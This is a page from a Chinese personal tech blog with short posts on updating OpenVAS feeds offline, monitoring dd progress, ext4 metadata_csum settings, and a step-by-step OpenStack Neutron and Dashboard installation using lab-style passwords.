+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/var/lib/openvas]</span><br><span class="line">└─# tar -czvf ~/plugins.tar.gz /var/lib/openvas/plugins</span><br><span class="line">┌──(root💀kali)-[/var/lib]</span><br><span class="line">└─# tar -czvf ~/gvm.tar.gz /var/lib/gvm</span><br></pre></td></tr></table></figure>
+
+<p>将打包好的plugins.tar.gz 和gvm.tar.gz拿到断网机器上并复制到 /tmp目录下</p>
+<p>然后再执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/wky]</span><br><span class="line">└─# gvm-feed-update</span><br></pre></td></tr></table></figure>
+
+<p>即可，因为断网的更新脚本已经被修改过了，会在/tmp下寻找数据库的压缩包来更新数据库</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/30/openvas%E6%9C%AC%E5%9C%B0%E5%8C%96/" data-id="cl0j9vktt000nlq1489b834mg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gvm/" rel="tag">gvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/openvas/" rel="tag">openvas</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-查看dd进度" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/24/%E6%9F%A5%E7%9C%8Bdd%E8%BF%9B%E5%BA%A6/" class="article-date">
+  <time datetime="2020-12-24T01:52:04.000Z" itemprop="datePublished">2020-12-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/24/%E6%9F%A5%E7%9C%8Bdd%E8%BF%9B%E5%BA%A6/">查看dd进度</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>使用dd刻盘时查看dd进度</p>
+<p>sudo watch -n 5 killall -USR1 dd</p>
+<p>growisofs -dvd-compat -speed=4 -Z /dev/sr0=test.iso</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/12/24/%E6%9F%A5%E7%9C%8Bdd%E8%BF%9B%E5%BA%A6/" data-id="ckj27024k0001wf3e7g0qh0hm" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dd/" rel="tag">dd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/watch/" rel="tag">watch</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ext4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/10/ext4/" class="article-date">
+  <time datetime="2020-12-10T09:03:22.000Z" itemprop="datePublished">2020-12-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/10/ext4/">ext4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>使用metadata_csum</p>
+<p>mkfs.ext4 -O metadata_csum,64bit /dev/sda</p>
+<p>有的内核不支持，报错，可以去掉metadata_csum</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e2fsck -f &#x2F;dev&#x2F;sda</span><br><span class="line">tune2fs -O -metadata_csum &#x2F;dev&#x2F;sda</span><br><span class="line">e2fsck -f &#x2F;dev&#x2F;sda</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/12/10/ext4/" data-id="ckj27024s0003wf3ebaij1uiw" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ext4/" rel="tag">ext4</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metadata-csum/" rel="tag">metadata_csum</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-openstack适配-2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/28/openstack%E9%80%82%E9%85%8D-2/" class="article-date">
+  <time datetime="2020-09-28T08:59:00.000Z" itemprop="datePublished">2020-09-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/28/openstack%E9%80%82%E9%85%8D-2/">openstack适配_2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>控制节点安装配置Networking service<br>mysql -uroot -p123456 -e “CREATE DATABASE neutron”<br>mysql -uroot -p123456 -e “GRANT ALL PRIVILEGES ON neutron.* TO ‘neutron’@’localhost’ IDENTIFIED BY ‘123456’”<br>mysql -uroot -p123456 -e “GRANT ALL PRIVILEGES ON neutron.* TO ‘neutron’@’%’ IDENTIFIED BY ‘123456’”<br>openstack user create –domain default –password 123456 neutron<br>openstack role add –project service –user neutron admin<br>openstack service create –name neutron –description “OpenStack Networking” network<br>openstack endpoint create –region RegionOne network public <a target="_blank" rel="noopener" href="http://controller:9696/">http://controller:9696</a><br>openstack endpoint create –region RegionOne network internal <a target="_blank" rel="noopener" href="http://controller:9696/">http://controller:9696</a><br>openstack endpoint create –region RegionOne network admin <a target="_blank" rel="noopener" href="http://controller:9696/">http://controller:9696</a><br>yum install openstack-neutron openstack-neutron-ml2 -y</p>
+<p>cp /etc/neutron/neutron.conf /etc/neutron/neutron.conf.bak<br>egrep -v “^$|^#” /etc/neutron/neutron.conf.bak &gt;/etc/neutron/neutron.conf</p>
+<p>修改/etc/neutron/neutron.conf<br>[DEFAULT]<br>bind_host = 192.168.50.88<br>core_plugin = ml2<br>service_plugins = router<br>allow_overlapping_ips = true<br>auth_strategy = keystone<br>transport_url = rabbit://openstack:123456@controller:5672<br>notify_nova_on_port_status_changes = true<br>notify_nova_on_port_data_changes = true<br>[database]<br>connection = mysql+pymysql://neutron:123456@controller/neutron</p>
+<p>[keystone_authtoken]<br>www_authenticate_uri = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>auth_url = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>memcached_servers = controller:11211<br>auth_type = password<br>project_domain_name = Default<br>user_domain_name = Default<br>project_name = service<br>username = neutron<br>password = 123456</p>
+<p>[nova]<br>auth_url = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>auth_type = password<br>project_domain_name = default<br>user_domain_name = default<br>region_name = RegionOne<br>project_name = service<br>username = nova<br>password = 123456</p>
+<p>[oslo_concurrency]<br>lock_path = /var/lib/neutron/tmp</p>
+<p>修改/etc/nova/nova.conf<br>[neutron]<br>auth_url = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>auth_type = password<br>project_domain_name = default<br>user_domain_name = default<br>region_name = RegionOne<br>project_name = service<br>username = neutron<br>password = 123456<br>service_metadata_proxy = true<br>metadata_proxy_shared_secret = devops</p>
+<p>cp /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugins/ml2/ml2_conf.ini.bak<br>egrep -v “^$|^#” /etc/neutron/plugins/ml2/ml2_conf.ini.bak &gt;/etc/neutron/plugins/ml2/ml2_conf.ini<br>然后修改该文件<br>[ml2]<br>type_drivers = flat,vlan,vxlan<br>tenant_network_types = vxlan<br>mechanism_drivers = linuxbridge,l2population<br>extension_drivers = port_security</p>
+<p>[ml2_type_flat]<br>flat_networks = provider</p>
+<p>[ml2_type_vxlan]<br>vni_ranges = 1:1000</p>
+<p>[securitygroup]<br>enable_ipset = true</p>
+<p>执行 su -s /bin/sh -c “neutron-db-manage –config-file /etc/neutron/neutron.conf <br>–config-file /etc/neutron/plugins/ml2/ml2_conf.ini upgrade head” neutron<br>systemctl restart openstack-nova-api.service<br>systemctl status openstack-nova-api.service<br>ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini<br>systemctl enable neutron-server.service<br>systemctl restart neutron-server.service<br>systemctl status neutron-server.service</p>
+<p>计算节点安装Networking service<br>yum install openstack-neutron openstack-neutron-ml2 openstack-neutron-linuxbridge ebtables -y<br>cp /etc/neutron/neutron.conf /etc/neutron/neutron.conf.bak<br>egrep -v “^$|^#” /etc/neutron/neutron.conf.bak &gt;/etc/neutron/neutron.conf</p>
+<p>修改/etc/neutron/neutron.conf<br>[DEFAULT]<br>auth_strategy = keystone<br>transport_url = rabbit://rabbitmq:123456@controller:5672<br>[database]<br>connection = mysql+pymysql://neutron:123456@controller/neutron<br>[keystone_authtoken]<br>www_authenticate_uri = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>auth_url = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>memcached_servers = controller:11211<br>auth_type = password<br>project_domain_name = Default<br>user_domain_name = Default<br>project_name = service<br>username = neutron<br>password = 123456</p>
+<p>[oslo_concurrency]<br>lock_path = /var/lib/neutron/tmp</p>
+<p>修改/etc/nova/nova.conf</p>
+<p>[neutron]<br>auth_url = <a target="_blank" rel="noopener" href="http://controller:5000/">http://controller:5000</a><br>auth_type = password<br>project_domain_name = default<br>user_domain_name = default<br>region_name = RegionOne<br>project_name = service<br>username = neutron<br>password = 123456</p>
+<p>systemctl restart openstack-nova-compute.service<br>修改/etc/neutron/plugins/ml2/ml2_conf.ini<br>[ml2]<br>type_drivers = flat,vlan,vxlan<br>tenant_network_types = vxlan<br>mechanism_drivers = linuxbridge,l2population<br>extension_drivers = port_security</p>
+<p>[ml2_type_flat]<br>flat_networks = provider</p>
+<p>[ml2_type_vxlan]<br>vni_ranges = 1:1000</p>
+<p>[securitygroup]<br>enable_ipset = true</p>
+<p>修改/etc/neutron/plugins/ml2/linuxbridge_agent.ini<br>[linux_bridge]<br>physical_interface_mappings = provider:enp0s8</p>
+<p>[vxlan]<br>enable_vxlan = true<br>local_ip = 192.168.50.148<br>l2_population = true</p>
+<p>[securitygroup]<br>enable_security_group = true<br>firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</p>
+<p>修改/etc/neutron/l3_agent.ini<br>[DEFAULT]<br>interface_driver = linuxbridge</p>
+<p>修改/etc/neutron/dhcp_agent.ini</p>
+<p>[DEFAULT]<br>interface_driver = linuxbridge<br>dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq<br>enable_isolated_metadata = true</p>
+<p>修改/etc/neutron/metadata_agent.ini<br>[DEFAULT]<br>nova_metadata_host = controller<br>metadata_proxy_shared_secret = devops</p>
+<p>然后执行<br>systemctl enable neutron-linuxbridge-agent neutron-dhcp-agent neutron-metadata-agent neutron-l3-agent<br>systemctl restart neutron-linuxbridge-agent neutron-dhcp-agent neutron-metadata-agent neutron-l3-agent<br>systemctl status neutron-linuxbridge-agent neutron-dhcp-agent neutron-metadata-agent neutron-l3-agent</p>
+<p>控制节点 安装Dashboard<br>yum install -y openstack-dashboard<br>sed -i ‘118c OPENSTACK_HOST = “controller”‘ /etc/openstack-dashboard/local_settings<br>sed -i “39c ALLOWED_HOSTS = [‘*’]” /etc/openstack-dashboard/local_settings<br>sed -i “104c SESSION_ENGINE = ‘django.contrib.sessions.backends.cache’” /etc/openstack-dashboard/local_settings<br>sed -i “94c CACHES = {“ /etc/openstack-dashboard/local_settings<br>sed -i “95c ‘default’: {“ /etc/openstack-dashboard/local_settings<br>sed -i “96c ‘BACKEND’: ‘django.core.cache.backends.memcached.MemcachedCache’,” /etc/openstack-dashboard/local_settings<br>sed -i “97c ‘LOCATION’: ‘controller:11211’,” /etc/openstack-dashboard/local_settings<br>sed -i “98c }” /etc/openstack-dashboard/local_settings<br>sed -i “99c }” /etc/openstack-dashboard/local_settings<br>sed -i ‘119c OPENSTACK_KEYSTONE_URL = “http://%s:5000/v3” % OPENSTACK_HOST’ /etc/openstack-dashboard/local_settings<br>echo ‘OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True’ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘OPENSTACK_API_VERSIONS = {‘ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘    “identity”: 3,’ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘    “image”: 2,’ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘    “volume”: 3’ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘}’ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = “Default”‘ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘OPENSTACK_KEYSTONE_DEFAULT_ROLE = “user”‘ &gt;&gt; /etc/openstack-dashboard/local_settings<br>sed -i ‘123c TIME_ZONE = “Asia/Shanghai”‘ /etc/openstack-dashboard/local_settings<br>echo “WEBROOT = ‘/dashboard/‘“ &gt;&gt; /etc/openstack-dashboard/local_settings<br>echo ‘WSGIApplicationGroup %{GLOBAL}’ &gt;&gt; /etc/httpd/conf.d/openstack-dashboard.conf<br>systemctl restart httpd.service memcached.service</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/09/28/openstack%E9%80%82%E9%85%8D-2/" data-id="ckj277c6b0001y53e4fri2661" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/openstack%E9%80%82%E9%85%8D/" rel="tag">openstack适配</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    <a class="extend prev" rel="prev" href="/page/17/">&amp;laquo; __(&#39;prev&#39;)</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="page-number" href="/page/17/">17</a><span class="page-number current">18</span><a class="page-number" href="/page/19/">19</a><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/19/">__(&#39;next&#39;) &amp;raquo;</a>
+  </nav>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/" rel="tag">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" rel="tag">c demo使用说明</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit/" rel="tag">cockpit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-DBus-Client/" rel="tag">cockpit.DBus Client</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit-js/" rel="tag">cockpit.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" rel="tag">cockpit数据格式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" rel="tag">cockpit文件操作</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/configobj/" rel="tag">configobj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" rel="tag">dbus服务自启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dd/" rel="tag">dd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ext4/" rel="tag">ext4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gvm/" rel="tag">gvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/json/" rel="tag">json</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metadata-csum/" rel="tag">metadata_csum</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nfs/" rel="tag">nfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-conf/" rel="tag">nginx.conf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack/" rel="tag">openstack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openstack%E9%80%82%E9%85%8D/" rel="tag">openstack适配</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openvas/" rel="tag">openvas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/policykit/" rel="tag">policykit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/polkit/" rel="tag">polkit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qt/" rel="tag">qt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/review/" rel="tag">review</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/share/" rel="tag">share</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tip/" rel="tag">tip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ussuri/" rel="tag">ussuri</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vim/" rel="tag">vim</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/watch/" rel="tag">watch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="tag">分析报告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" rel="tag">各个模块介绍</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" rel="tag">第一周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" rel="tag">第三周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" rel="tag">第二周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" rel="tag">第五周</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" rel="tag">第四周</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Algorithm/" style="font-size: 15px;">Algorithm</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/c-demo%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" style="font-size: 10px;">c demo使用说明</a> <a href="/tags/cockpit/" style="font-size: 16.25px;">cockpit</a> <a href="/tags/cockpit-DBus-Client/" style="font-size: 10px;">cockpit.DBus Client</a> <a href="/tags/cockpit-js/" style="font-size: 10px;">cockpit.js</a> <a href="/tags/cockpit%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" style="font-size: 10px;">cockpit数据格式</a> <a href="/tags/cockpit%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 10px;">cockpit文件操作</a> <a href="/tags/configobj/" style="font-size: 10px;">configobj</a> <a href="/tags/cve/" style="font-size: 20px;">cve</a> <a href="/tags/dbus/" style="font-size: 11.25px;">dbus</a> <a href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">dbus服务自启动</a> <a href="/tags/dd/" style="font-size: 10px;">dd</a> <a href="/tags/ext4/" style="font-size: 10px;">ext4</a> <a href="/tags/gvm/" style="font-size: 10px;">gvm</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/metadata-csum/" style="font-size: 10px;">metadata_csum</a> <a href="/tags/nfs/" style="font-size: 10px;">nfs</a> <a href="/tags/nginx-conf/" style="font-size: 10px;">nginx.conf</a> <a href="/tags/openstack/" style="font-size: 12.5px;">openstack</a> <a href="/tags/openstack%E9%80%82%E9%85%8D/" style="font-size: 10px;">openstack适配</a> <a href="/tags/openvas/" style="font-size: 10px;">openvas</a> <a href="/tags/policykit/" style="font-size: 10px;">policykit</a> <a href="/tags/polkit/" style="font-size: 10px;">polkit</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/qt/" style="font-size: 10px;">qt</a> <a href="/tags/review/" style="font-size: 15px;">review</a> <a href="/tags/share/" style="font-size: 13.75px;">share</a> <a href="/tags/sudo/" style="font-size: 13.75px;">sudo</a> <a href="/tags/tip/" style="font-size: 15px;">tip</a> <a href="/tags/ussuri/" style="font-size: 10px;">ussuri</a> <a href="/tags/vim/" style="font-size: 17.5px;">vim</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/watch/" style="font-size: 10px;">watch</a> <a href="/tags/wget/" style="font-size: 12.5px;">wget</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/" style="font-size: 10px;">各个模块介绍</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" style="font-size: 18.75px;">安全公告</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 10px;">漏洞分析</a> <a href="/tags/%E7%AC%AC%E4%B8%80%E5%91%A8/" style="font-size: 13.75px;">第一周</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E5%91%A8/" style="font-size: 13.75px;">第三周</a> <a href="/tags/%E7%AC%AC%E4%BA%8C%E5%91%A8/" style="font-size: 13.75px;">第二周</a> <a href="/tags/%E7%AC%AC%E4%BA%94%E5%91%A8/" style="font-size: 12.5px;">第五周</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E5%91%A8/" style="font-size: 13.75px;">第四周</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/05/19/curl-CVE-2019-5481%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-5481安全公告</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/19/curl-CVE-2019-5482%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-5482安全公告</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/19/curl-CVE-2018-16890%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2018-16890安全公告</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/19/curl-CVE-2019-3822%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-3822安全公告</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/19/curl-CVE-2019-3823%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">curl-CVE-2019-3823安全公告</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 王<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
